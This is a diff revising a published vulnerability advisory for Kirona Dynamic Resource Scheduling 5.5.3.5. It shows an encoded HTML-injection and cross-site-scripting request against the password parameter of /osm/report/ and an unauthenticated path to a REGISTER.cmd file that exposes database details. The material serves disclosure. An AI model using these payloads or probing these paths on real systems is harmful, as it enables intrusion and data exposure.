@@ -3,9 +3,9 @@
 # Discovered Date: 03/10/2019
 # Exploit Author: Ramikan
 # Vendor Homepage: https://www.kirona.com/solutions/dynamic-resource-scheduling/
-# Affected Version: 5.5.3.5 may be other versionss.
-# Tested On Version: 5.5.3.5 
-# Vendor Fix: N/A
+# Affected Version: 5.5.3.5 may be other versions.
+# Tested On Version: 5.5.3.5 on PHP/5.6.14
+# Vendor Fix: Unknown
 # CVE: N/A	
 # Category: Web Apps
 # Reference : https://github.com/Ramikan/Vulnerabilities/blob/master/Kirona-DRS 5.5.3.5 Multiple Vulnerabilities
@@ -19,7 +19,11 @@ The application is vulnerable to the HTML injection, cross site scripting and se
 ***************************************************************************************************************************
 Vulnerabiity 1:HTML injection and XSS
 ***************************************************************************************************************************
-Parameter Affected : password
+
+Affected URL: /osm/report/
+
+
+Affected Parameter: password
 
 
 POST Request:
@@ -74,7 +78,7 @@ Content-Type: text/html;charset=UTF-8
 
 GET Request:
 
-GET https://vs-kdrs-l-01.selwoodhousing.local/osm/report/?password=%27%3C%22%20%3E%3C%3Ch1%3EHTML%20Injection-heading%20tag%20used%3C/h1%3E%3Cscript%3Ealert(%22This%20is%20Cross%20Site%20Scripting%22)%3C/script%3E%3C!-- HTTP/1.1
+GET https://10.0.1.110/osm/report/?password=%27%3C%22%20%3E%3C%3Ch1%3EHTML%20Injection-heading%20tag%20used%3C/h1%3E%3Cscript%3Ealert(%22This%20is%20Cross%20Site%20Scripting%22)%3C/script%3E%3C!-- HTTP/1.1
 Host: vs-kdrs-l-01.selwoodhousing.local
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -118,10 +122,10 @@ Content-Type: text/html;charset=UTF-8
         
 
 ***************************************************************************************************************************
-Vulnerability 2: Source code and sensitive info disclosure.
+Vulnerability 2: Source code and sensitive data disclosure.
 ***************************************************************************************************************************
 
-Unauthenticated user can access this link (/osm/REGISTER.cmd, /osm_tiles/REGISTER.cmd) diectly which contains the sensitive info about the database. Exposes the sql database information such as tablename, username, etc.
+Unauthenticated user can access this link (/osm/REGISTER.cmd, /osm_tiles/REGISTER.cmd) diectly which contains the sensitive info about the database through the SQL query. This file exposes the sql database information such asDatabase version, tablename, column name, etc.
 
 https://10.0.0.148/osm/REGISTER.cmd
 
